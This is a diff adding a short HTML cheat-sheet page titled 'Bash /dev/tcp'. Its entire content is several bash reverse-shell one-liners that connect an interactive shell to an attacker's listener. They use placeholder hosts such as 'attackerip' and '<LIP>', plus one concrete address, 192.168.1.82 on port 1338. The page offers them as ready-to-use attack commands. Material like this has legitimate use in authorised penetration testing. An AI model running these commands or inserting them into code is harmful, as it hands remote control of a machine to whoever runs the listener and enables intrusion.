@@ -1,0 +1,21 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Bash /dev/tcp</title>
+</head><body>Also see Reverse Shells / Shells &gt; /dev/tcp<br/>
+<br/>
+/dev/tcp is NOT available on ALL bash implementations, see page above for details<br/>
+<br/>
+<br/>
+bash -i &gt;&amp; /dev/tcp/&lt;LIP&gt;/&lt;LPORT&gt; 0&gt;&amp;1<br/>
+<br/>
+exec /bin/bash 0&amp;0 2&gt;&amp;0 0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/attackerip/4444; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196<br/>
+&nbsp; OR<br/>
+exec 5&lt;&gt;/dev/tcp/attackerip/4444<br/>
+cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done &nbsp;<br/>
+# or: while read line 0&lt;&amp;5; do $line 2&gt;&amp;5 &gt;&amp;5; done<br/>
+<br/>
+<br/>
+<br/>
+/bin/bash -i &gt; /dev/tcp/192.168.1.82/1338 0&lt;&amp;1 2&gt;&amp;1&#09;&#09;????</body></html>
